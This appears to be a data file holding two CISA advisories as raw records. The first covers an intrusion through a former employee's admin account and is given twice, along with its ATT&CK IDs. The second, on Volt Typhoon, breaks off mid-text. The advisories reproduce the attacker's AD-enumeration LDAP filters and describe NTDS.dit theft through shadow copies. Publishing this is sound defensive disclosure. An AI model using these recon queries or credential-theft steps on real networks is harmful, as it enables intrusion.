LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, Search Filter: (objectCategory=CN=Person,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)
Collects names and metadata of users in the domain.


LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, Search Filter: (objectCategory=CN=Computer,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)
Collects names and metadata of hosts in the domain.


LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, Search Filter: (objectCategory=CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)
Collects trust information in the domain.


LDAP Search Scope: WholeSubtree, Base Object: DC=[REDACTED],DC=local, Search Filter: ( &  ( &  (sAMAccountType=805306368)  (servicePrincipalName=*) ( ! (sAMAccountName=krbtgt) ) ( !  (userAccountControl&2) ) )  (adminCount=1) )
Collects Domain Administrators and Service Principals in the domain.



Service Authentication
Through the VM connection, the threat actor was observed authenticating to various services on the victim organization’s network from the USER1 and USER2 administrative accounts. In all instances, the threat actor authenticated to the Common Internet File Service (CIFS) on various endpoints [T1078.002],[T1021.002]—a protocol used for providing shared access to files and printers between machines on the network. This was likely used for file, folder, and directory discovery [T1083], and assessed to be executed in an automated manner.

USER1 authenticated to four services, presumably for the purpose of network and service discovery [T1046].
USER2 authenticated to twelve services. Note: This account had administrative privileges to both the on-premises network and Azure tenant.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor’s tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

Table 2: Reconnaissance


Technique Title
ID
Use




Gather Victim Identity Information: Credentials
T1589.001
The actor likely gathered USER1 account credentials in a data breach where account information appeared in publicly available channels.




Table 3: Initial Access


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
The actor gained initial access through the compromised account of a former employee with administrative privileges (USER1). The employee’s account was not immediately disabled after their departure.




Table 4: Persistence


Technique Title
ID
Use




External Remote Services
T1133
The actor connected a VM via the victim’s VPN to blend in with legitimate traffic to evade detection.




Table 5: Privilege Escalation


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
The actor authenticated to multiple services from a compromised Global Domain Administrator account (USER2). The actor also authenticated to the Common Internet File Service (CIFS) on various endpoints.


Valid Accounts: Cloud Accounts
T1078.004
The actor used a compromised account (USER2) which was synced to both the on-premises AD and Azure AD, thus enabling administrative privileges to both the on-premises network and Azure tenant.




Table 6: Credential Access


Technique Title
ID
Use




Unsecured Credentials: Credentials in Files
T1552.001
The actor likely obtained USER2 account credentials from the virtualized SharePoint server where they were locally stored.




Table 7: Discovery


Technique Title
ID
Use




Account Discovery: Domain Account
T1087.002
Through the VM connection, the actor executed LDAP queries of the AD.


Remote System Discovery
T1018
Through the VM connection, the actor executed LDAP queries to collect user and host information.


Domain Trust Discovery
T1482
Through the VM connection, the actor executed LDAP queries to collect trust relationship information.


File and Directory Discovery
T1083
The actor authenticated to the CIFS on various endpoints likely for the purpose of file, folder, and directory discovery.


Network Service Discovery
T1046
The actor used the compromised USER1 account to authenticate to four services, presumably for the purpose of network and service discovery.




Table 8: Lateral Movement


Technique Title
ID
Use




Remote Services
T1021
The actor connected from an unknown VM and authenticated to multiple services via the USER1 account.


Remote Services: Cloud Services
T1021.007
The actor used the USER2 account, which granted access to the Azure AD, as well as the on-premises AD.


Remote Services: SMB/Windows Admin Shares
T1021.002
The actor used compromised accounts to interact with a remote network share using Server Message Block.




Table 9: Collection


Technique Title
ID
Use




Data from Information Repositories: SharePoint
T1213.002
The actor likely obtained the USER2 account credentials from the virtualized SharePoint server managed by USER1.



MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST), which apply to all critical infrastructure organizations and network defenders. The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Secure and Monitor Administrator Accounts
The threat actor gained access to the network via compromised administrator accounts that did not have MFA enabled. The compromised USER2 Global Domain Administrator account could have enabled the threat actor to move laterally from the on-premises environment to the Azure tenant. In response to the incident, the victim organization removed administrator privileges for USER2. Additionally, the victim organization disabled unnecessary administrator accounts and enabled MFA for all administrator accounts. To prevent similar compromises, CISA and MS-ISAC recommend the following:

Review current administrator accounts to determine their necessity and only maintain administrator accounts that are essential for network management. This will reduce the attack surface and focus efforts on the security and monitoring of necessary accounts.
Restrict the use of multiple administrator accounts for one user.
Create separate administrator accounts for on-premises and Azure environments to segment access.
Implement the principle of least privilege to decrease threat actor’s ability to access key network resources. Enable just-in-time and just enough access for administrator accounts to elevate the minimum necessary privileges for a limited time to complete tasks.
Use phishing-resistant multifactor authentication (MFA) [CPG 2.H] (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services as possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins [M1032]. For additional guidance on secure MFA configurations, visit CISA’s More than a Password webpage and read CISA’s Implementing Phishing-Resistant MFA fact sheet.

Reduce Attack Surface
Unnecessary accounts, software, and services in the network create additional vectors for a threat actor to compromise. CISA and MS-ISAC recommend the following:

Establish policy and procedure for the prompt removal of unnecessary accounts and groups from the enterprise, especially privileged accounts. Organizations should implement a robust and continuous user management process to ensure accounts of offboarded employees are removed and can no longer access the network.
Maintain a robust asset management policy through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.

Determine the need and functionality of assets that require public internet exposure [CPG 1.A].


Follow a routine patching cycle for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
Restrict personal devices from connecting to the network. Personal devices are not subject to the same group policies and security measures as domain joined devices.

Evaluate Tenant Settings
By default, in Azure AD all users can register and manage all aspects of applications they create. Users can also determine and approve what organizational data and services the application can access. These default settings can enable a threat actor to access sensitive information and move laterally in the network. In addition, users who create an Azure AD automatically become the Global Administrator for that tenant. This could allow a threat actor to escalate privileges to execute malicious actions. CISA and MS-ISAC recommend the following:

Evaluate current user permissions in the Azure tenant to restrict potentially harmful permissions including:

Restrict users’ ability to register applications. By default, all users in Azure AD can register and manage the applications they create and approve the data and services the application can access. If this is exploited, a threat actor can access sensitive information and move laterally in the network.
Restrict non-administrators from creating tenants. Any user who creates an Azure AD automatically becomes the Global Administrator for that tenant. This creates an opportunity for a threat actor to escalate privileges to the highest privileged account.
Restrict access to the Azure AD portal to administrators only. Users without administrative privileges cannot change settings, however, they can view user info, group info, device details, and user privileges. This would allow a threat actor to gather valuable information for malicious activities.



Create a Forensically Ready Organization

Collect access- and security-focused logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and virtual private network) for use in both detection and incident response activities [CPG 2.T].
Enable complete coverage of tools, including Endpoint Detection and Response (EDR), across the environment for thorough analysis of anomalous activity and remediation of potential vulnerabilities.

Assess Security Configuration of Azure Environment
CISA created the Secure Cloud and Business Applications (SCuBA) assessment tool to help Federal Civilian Executive Branch (FCEB) agencies to verify that a M365 tenant configuration conforms to a minimal viable secure configuration baseline. Although the SCuBA assessment tool was developed for FCEB, other organizations can benefit from its output. CISA and MS-ISAC recommend the following:

Use tools that identify attack paths. This will enable defenders to identify common attack paths used by threat actors and shut them down before they are exploited.
Review the security recommendations list provided by Microsoft 365 Defender. Focus remediation on critical vulnerabilities on endpoints that are essential to mission execution and contain sensitive data.

Evaluate Conditional Access Policies
Conditional access policies require users who want to access a resource to complete an action. Conditional access policies also account for common signals, such as user or group memberships, IP location information, device, application, and risky sign-in behavior identified through integration with Azure AD Identity Protection.

Review current conditional access policies to determine if changes are necessary.

Reset All Passwords and Establish Secure Password Policies
In response to the incident, the victim organization reset passwords for all users.

Employ strong password management alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as user passwords expire [CPG 2.A],[CPG 2.B],[CPG 2.C].
Store credentials in a secure manner, such as with a credential manager, vault, or other privileged account management solution [CPG 2.L].
For products that come with default passwords, ask vendors how they plan to eliminate default passwords, as highlighted in CISA’s Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords.

Mitigations for Vendors
CISA recommends that vendors incorporate secure by design principles and tactics into their practices, limiting the impact of threat actor techniques and strengthening the secure posture for their customers.

Prioritize secure by default configurations, such as eliminating default passwords and providing high-quality audit logs to customers with no additional configuration, at no extra charge. Secure by default configurations should be prioritized to eliminate the need for customer implementation of hardening guidance.
Immediately identify, mitigate, and update affected products that are not patched in accordance with CISA’s Known Exploited Vulnerabilities (KEV) catalog.
Implement multifactor authentication (MFA), ideally phishing-resistant MFA, as a default (rather than opt-in) feature for all products.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

MS-ISAC: Center for Internet Security (CIS) Cyber-Attack Defense: CIS Benchmarks + CDM + MITRE ATT&CK

REFERENCES
[1] CISA Analysis: Fiscal Year 2022 Risk and Vulnerability Assessments
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or MS-ISAC.
VERSION HISTORY
February 15, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1021.007', 'T1083', 'T1087.002', 'T1552.001', 'T1021', 'T1018', 'T1021.002', 'T1046', 'T1133', 'T1078.004', 'T1078.002', 'T1213.002', 'T1482', 'T1589.001'}","






Actions to take today to mitigate malicious cyber activity:




Continuously remove and disable accounts and groups from the enterprise that are no longer needed, especially privileged accounts.
Enable and enforce multifactor authentication with strong passwords.
Store credentials in a secure manner, such as with a credential manager, vault, or other privilege account management solution.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and the Multi-State Information Sharing & Analysis Center (MS-ISAC) conducted an incident response assessment of a state government organization’s network environment after documents containing host and user information, including metadata, were posted on a dark web brokerage site. Analysis confirmed that an unidentified threat actor compromised network administrator credentials through the account of a former employee—a technique commonly leveraged by threat actors—to successfully authenticate to an internal virtual private network (VPN) access point, further navigate the victim’s on-premises environment, and execute various lightweight directory access protocol (LDAP) queries against a domain controller.,1, Analysis also focused on the victim’s Azure environment, which hosts sensitive systems and data, as well as the compromised on-premises environment. Analysis determined there were no indications the threat actor further compromised the organization by moving laterally from the on-premises environment to the Azure environment.
CISA and MS-ISAC are releasing this Cybersecurity Advisory (CSA) to provide network defenders with the tactics, techniques, and procedures (TTPs) used by the threat actor and methods to protect against similar exploitation of both unnecessary and privileged accounts.
Download the PDF version of this report:


AA24-046A Threat Actor Leverages Compromised Account of Former Employee to Access State Government Organization
(PDF,       499.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actor’s activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
A state government organization was notified that documents containing host and user information, including metadata, were posted on a dark web brokerage site. After further investigation, the victim organization determined that the documents were accessed via the compromised account of a former employee. Threat actors commonly leverage valid accounts, including accounts of former employees that have not been properly removed from the Active Directory (AD), to gain access to organizations.,1, CISA and MS-ISAC assessed that an unidentified threat actor likely accessed documents containing host and user information to post on the dark web for profit after gaining access through the account of a former employee.
The scope of this investigation included the victim organization’s on-premises environment, as well as their Azure environment, which hosts sensitive systems and data. Analysis determined the threat actor did not move laterally from the compromised on-premises network to the Azure environment and did not compromise sensitive systems.
Untitled Goose Tool
Incident responders collected Azure and Microsoft Defender for Endpoint (MDE) logs using CISA’s Untitled Goose Tool—a free tool to help network defenders detect potentially malicious activity in Microsoft Azure, Azure Active Directory (AAD), and Microsoft 365 (M365) environments. CISA developed the Untitled Goose Tool to export and review AAD sign-in and audit logs, M365 unified audit logs (UAL), Azure activity logs, and MDE data. By exporting cloud artifacts, Untitled Goose Tool supports incident response teams with environments that do not ingest logs into a security information and event management (SIEM) tool.
Threat Actor Activity
The logs revealed the threat actor first connected from an unknown virtual machine (VM) to the victim’s on-premises environment via internet protocol (IP) addresses within their internal VPN range. CISA and MS-ISAC assessed that the threat actor connected to the VM through the victim’s VPN, with the intent to blend in with legitimate traffic to evade detection.
Initial Access: Compromised Domain Accounts
USER1: The threat actor gained initial access through the compromised account of a former employee with administrative privileges (USER1), to conduct reconnaissance and discovery activities. The victim organization confirmed that this account was not disabled immediately following the employee’s departure.

The threat actor likely obtained the USER1 account credentials in a separate data breach due to the credentials appearing in publicly available channels containing leaked account information,.
USER1 had access to two virtualized servers including SharePoint and the workstation of the former employee. The workstation was virtualized from a physical workstation using the Veeam Physical to Virtual (P2V) function within the backup software.

USER2: The threat actor likely obtained the USER2 account credentials from the virtualized SharePoint server managed by USER1,. The victim confirmed that the administrator credentials for USER2 were stored locally on this server,.

Through connection from the VM, the threat actor authenticated to multiple services, via the USER1 account, as well as from an additional compromised global domain administrator account (USER2),.
The threat actor’s use of the USER2 account was impactful due to the access it granted to both the on-premises AD and Azure AD, thus enabling administrative privileges,.

Following notification of the dark web posting, the victim organization immediately disabled the USER1 account and took the two virtualized servers associated with the former employee offline. The victim also changed the password for the USER2 account and removed administrator privileges. Neither of the administrative accounts had multifactor authentication (MFA) enabled.
LDAP Queries
Through connection from the VM, the threat actor conducted LDAP queries of the AD, likely using the open source tool AdFind.exe, based on the format of the output. CISA and MS-ISAC assess the threat actor executed the LDAP queries, to collect user, host, and trust relationship information,. It is also believed the LDAP queries generated the text files the threat actor posted for sale on the dark web brokerage site: ad_users.txt, ad_computers.txt, and trustdmp.txt.
Table 1 lists all queries that were conducted between 08:39:43-08:40:56 Coordinated Universal Time (UTC).

Service Authentication
Through the VM connection, the threat actor was observed authenticating to various services on the victim organization’s network from the USER1 and USER2 administrative accounts. In all instances, the threat actor authenticated to the Common Internet File Service (CIFS) on various endpoints,—a protocol used for providing shared access to files and printers between machines on the network. This was likely used for file, folder, and directory discovery, and assessed to be executed in an automated manner.

USER1 authenticated to four services, presumably for the purpose of network and service discovery,.
USER2 authenticated to twelve services. Note: This account had administrative privileges to both the on-premises network and Azure tenant.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor’s tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.








MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST), which apply to all critical infrastructure organizations and network defenders. The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Secure and Monitor Administrator Accounts
The threat actor gained access to the network via compromised administrator accounts that did not have MFA enabled. The compromised USER2 Global Domain Administrator account could have enabled the threat actor to move laterally from the on-premises environment to the Azure tenant. In response to the incident, the victim organization removed administrator privileges for USER2. Additionally, the victim organization disabled unnecessary administrator accounts and enabled MFA for all administrator accounts. To prevent similar compromises, CISA and MS-ISAC recommend the following:

Review current administrator accounts to determine their necessity and only maintain administrator accounts that are essential for network management. This will reduce the attack surface and focus efforts on the security and monitoring of necessary accounts.
Restrict the use of multiple administrator accounts for one user.
Create separate administrator accounts for on-premises and Azure environments to segment access.
Implement the principle of least privilege to decrease threat actor’s ability to access key network resources. Enable just-in-time and just enough access for administrator accounts to elevate the minimum necessary privileges for a limited time to complete tasks.
Use phishing-resistant multifactor authentication (MFA),CPG 2.H, (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services as possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins,M1032,. For additional guidance on secure MFA configurations, visit CISA’s More than a Password webpage and read CISA’s Implementing Phishing-Resistant MFA fact sheet.

Reduce Attack Surface
Unnecessary accounts, software, and services in the network create additional vectors for a threat actor to compromise. CISA and MS-ISAC recommend the following:

Establish policy and procedure for the prompt removal of unnecessary accounts and groups from the enterprise, especially privileged accounts. Organizations should implement a robust and continuous user management process to ensure accounts of offboarded employees are removed and can no longer access the network.
Maintain a robust asset management policy through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.

Determine the need and functionality of assets that require public internet exposure,CPG 1.A,.


Follow a routine patching cycle for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
Restrict personal devices from connecting to the network. Personal devices are not subject to the same group policies and security measures as domain joined devices.

Evaluate Tenant Settings
By default, in Azure AD all users can register and manage all aspects of applications they create. Users can also determine and approve what organizational data and services the application can access. These default settings can enable a threat actor to access sensitive information and move laterally in the network. In addition, users who create an Azure AD automatically become the Global Administrator for that tenant. This could allow a threat actor to escalate privileges to execute malicious actions. CISA and MS-ISAC recommend the following:

Evaluate current user permissions in the Azure tenant to restrict potentially harmful permissions including:

Restrict users’ ability to register applications. By default, all users in Azure AD can register and manage the applications they create and approve the data and services the application can access. If this is exploited, a threat actor can access sensitive information and move laterally in the network.
Restrict non-administrators from creating tenants. Any user who creates an Azure AD automatically becomes the Global Administrator for that tenant. This creates an opportunity for a threat actor to escalate privileges to the highest privileged account.
Restrict access to the Azure AD portal to administrators only. Users without administrative privileges cannot change settings, however, they can view user info, group info, device details, and user privileges. This would allow a threat actor to gather valuable information for malicious activities.



Create a Forensically Ready Organization

Collect access- and security-focused logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and virtual private network) for use in both detection and incident response activities,CPG 2.T,.
Enable complete coverage of tools, including Endpoint Detection and Response (EDR), across the environment for thorough analysis of anomalous activity and remediation of potential vulnerabilities.

Assess Security Configuration of Azure Environment
CISA created the Secure Cloud and Business Applications (SCuBA) assessment tool to help Federal Civilian Executive Branch (FCEB) agencies to verify that a M365 tenant configuration conforms to a minimal viable secure configuration baseline. Although the SCuBA assessment tool was developed for FCEB, other organizations can benefit from its output. CISA and MS-ISAC recommend the following:

Use tools that identify attack paths. This will enable defenders to identify common attack paths used by threat actors and shut them down before they are exploited.
Review the security recommendations list provided by Microsoft 365 Defender. Focus remediation on critical vulnerabilities on endpoints that are essential to mission execution and contain sensitive data.

Evaluate Conditional Access Policies
Conditional access policies require users who want to access a resource to complete an action. Conditional access policies also account for common signals, such as user or group memberships, IP location information, device, application, and risky sign-in behavior identified through integration with Azure AD Identity Protection.

Review current conditional access policies to determine if changes are necessary.

Reset All Passwords and Establish Secure Password Policies
In response to the incident, the victim organization reset passwords for all users.

Employ strong password management alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as user passwords expire,CPG 2.A,CPG 2.B,CPG 2.C,.
Store credentials in a secure manner, such as with a credential manager, vault, or other privileged account management solution,CPG 2.L,.
For products that come with default passwords, ask vendors how they plan to eliminate default passwords, as highlighted in CISA’s Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords.

Mitigations for Vendors
CISA recommends that vendors incorporate secure by design principles and tactics into their practices, limiting the impact of threat actor techniques and strengthening the secure posture for their customers.

Prioritize secure by default configurations, such as eliminating default passwords and providing high-quality audit logs to customers with no additional configuration, at no extra charge. Secure by default configurations should be prioritized to eliminate the need for customer implementation of hardening guidance.
Immediately identify, mitigate, and update affected products that are not patched in accordance with CISA’s Known Exploited Vulnerabilities (KEV) catalog.
Implement multifactor authentication (MFA), ideally phishing-resistant MFA, as a default (rather than opt-in) feature for all products.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 2-9).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

MS-ISAC: Center for Internet Security (CIS) Cyber-Attack Defense: CIS Benchmarks + CDM + MITRE ATT&CK

REFERENCES,1, CISA Analysis: Fiscal Year 2022 Risk and Vulnerability Assessments
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or MS-ISAC.
VERSION HISTORY
February 15, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-046a
3,"






Actions to take today to mitigate Volt Typhoon activity:




Apply patches for internet-facing systems. Prioritize patching critical vulnerabilities in appliances known to be frequently exploited by Volt Typhoon.
Implement phishing-resistant MFA.
Ensure logging is turned on for application, access, and security logs and store logs in a central system.
Plan “end of life” for technology beyond manufacturer’s supported lifecycle.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China (PRC) state-sponsored cyber actors are seeking to pre-position themselves on IT networks for disruptive or destructive cyberattacks against U.S. critical infrastructure in the event of a major crisis or conflict with the United States.
CISA, NSA, FBI and the following partners are releasing this advisory to warn critical infrastructure organizations about this assessment, which is based on observations from the U.S. authoring agencies’ incident response activities at critical infrastructure organizations compromised by the PRC state-sponsored cyber group known as Volt Typhoon (also known as Vanguard Panda, BRONZE SILHOUETTE, Dev-0391, UNC3236, Voltzite, and Insidious Taurus):

U.S. Department of Energy (DOE)
U.S. Environmental Protection Agency (EPA)
U.S. Transportation Security Administration (TSA)
Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS), a part of the Communications Security Establishment (CSE)
United Kingdom National Cyber Security Centre (NCSC-UK)
New Zealand National Cyber Security Centre (NCSC-NZ)

The U.S. authoring agencies have confirmed that Volt Typhoon has compromised the IT environments of multiple critical infrastructure organizations—primarily in Communications, Energy, Transportation Systems, and Water and Wastewater Systems Sectors—in the continental and non-continental United States and its territories, including Guam. Volt Typhoon’s choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable lateral movement to OT assets to disrupt functions. The U.S. authoring agencies are concerned about the potential for these actors to use their network access for disruptive effects in the event of potential geopolitical tensions and/or military conflicts. CCCS assesses that the direct threat to Canada’s critical infrastructure from PRC state-sponsored actors is likely lower than that to U.S. infrastructure, but should U.S. infrastructure be disrupted, Canada would likely be affected as well, due to cross-border integration. ASD’s ACSC and NCSC-NZ assess Australian and New Zealand critical infrastructure, respectively, could be vulnerable to similar activity from PRC state-sponsored actors.
As the authoring agencies have previously highlighted, the use of living off the land (LOTL) techniques is a hallmark of Volt Typhoon actors’ malicious cyber activity when targeting critical infrastructure. The group also relies on valid accounts and leverage strong operational security, which combined, allows for long-term undiscovered persistence. In fact, the U.S. authoring agencies have recently observed indications of Volt Typhoon actors maintaining access and footholds within some victim IT environments for at least five years. Volt Typhoon actors conduct extensive pre-exploitation reconnaissance to learn about the target organization and its environment; tailor their tactics, techniques, and procedures (TTPs) to the victim’s environment; and dedicate ongoing resources to maintaining persistence and understanding the target environment over time, even after initial compromise.
The authoring agencies urge critical infrastructure organizations to apply the mitigations in this advisory and to hunt for similar malicious activity using the guidance herein provided, along with the recommendations found in joint guide Identifying and Mitigating Living Off the Land Techniques. These mitigations are primarily intended for IT and OT administrators in critical infrastructure organizations. Following the mitigations for prevention of or in response to an incident will help disrupt Volt Typhoon’s accesses and reduce the threat to critical infrastructure entities.
If activity is identified, the authoring agencies strongly recommend that critical infrastructure organizations apply the incident response recommendations in this advisory and report the incident to the relevant agency (see Contact Information section).
For additional information, see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection and U.S. Department of Justice (DOJ) press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report:


AA24-038A PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
(PDF,       1.56 MB
  )


Read the accompanying Malware Analysis Report: MAR-10448362-1.v1 Volt Typhoon.
For a downloadable copy of indicators of compromise (IOCs), see:


MAR-10448362.c1.v2.CLEAR_stix2.json
(JSON,       51.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See Appendix C: MITRE ATT&CK Tactics and Techniques section for tables of the Volt Typhoon cyber threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview of Activity
In May 2023, the authoring agencies—working with industry partners—disclosed information about activity attributed to Volt Typhoon (see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection). Since then, CISA, NSA, and FBI have determined that this activity is part of a broader campaign in which Volt Typhoon actors have successfully infiltrated the networks of critical infrastructure organizations in the continental and non-continental United States and its territories, including Guam.
The U.S. authoring agencies have primarily observed compromises linked to Volt Typhoon in Communications, Energy, Transportation Systems, and Water and Wastewater Systems sector organizations’ IT networks. Some victims are smaller organizations with limited cybersecurity capabilities that provide critical services to larger organizations or key geographic locations.
Volt Typhoon actors tailor their TTPs to the victim environment; however, the U.S. authoring agencies have observed the actors typically following the same pattern of behavior across identified intrusions. Their choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable the disruption of OT functions across multiple critical infrastructure sectors (see Figure 1).

Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network architecture and operational protocols. This reconnaissance includes identifying network topologies, security measures, typical user behaviors, and key network and IT staff. The intelligence gathered by Volt Typhoon actors is likely leveraged to enhance their operational security. For example, in some instances, Volt Typhoon actors may have abstained from using compromised credentials outside of normal working hours to avoid triggering security alerts on abnormal account activities.
Volt Typhoon typically gains initial access to the IT network by exploiting known or zero-day vulnerabilities in public-facing network appliances (e.g., routers, virtual private networks [VPNs], and firewalls) and then connects to the victim’s network via VPN for follow-on activities.
Volt Typhoon aims to obtain administrator credentials within the network, often by exploiting privilege escalation vulnerabilities in the operating system or network services. In some cases, Volt Typhoon has obtained credentials insecurely stored on a public-facing network appliance.
Volt Typhoon uses valid administrator credentials to move laterally to the domain controller (DC) and other devices via remote access services such as Remote Desktop Protocol (RDP).
Volt Typhoon conducts discovery in the victim’s network, leveraging LOTL binaries for stealth. A key tactic includes using PowerShell to perform targeted queries on Windows event logs, focusing on specific users and periods. These queries facilitate the discreet extraction of security event logs into .dat files, allowing Volt Typhoon actors to gather critical information while minimizing detection. This strategy, blending in-depth pre-compromise reconnaissance with meticulous post-exploitation intelligence collection, underscores their sophisticated and strategic approach to cyber operations.
Volt Typhoon achieves full domain compromise by extracting the Active Directory database (NTDS.dit) from the DC. Volt Typhoon frequently employs the Volume Shadow Copy Service (VSS) using command-line utilities such as vssadmin to access NTDS.dit. The NTDS.dit file is a centralized repository that contains critical Active Directory data, including user accounts, passwords (in hashed form), and other sensitive data, which can be leveraged for further exploitation. This method entails the creation of a shadow copy—a point-in-time snapshot—of the volume hosting the NTDS.dit file. By leveraging this snapshot, Volt Typhoon actors effectively bypass the file locking mechanisms inherent in a live Windows environment, which typically prevent direct access to the NTDS.dit file while the domain controller is operational.
Volt Typhoon likely uses offline password cracking techniques to decipher these hashes. This process involves extracting the hashes from the NTDS.dit file and then applying various password cracking methods, such as brute force attacks, dictionary attacks, or more sophisticated techniques like rainbow tables to uncover the plaintext passwords. The successful decryption of these passwords allows Volt Typhoon actors to obtain elevated access and further infiltrate and manipulate the network.
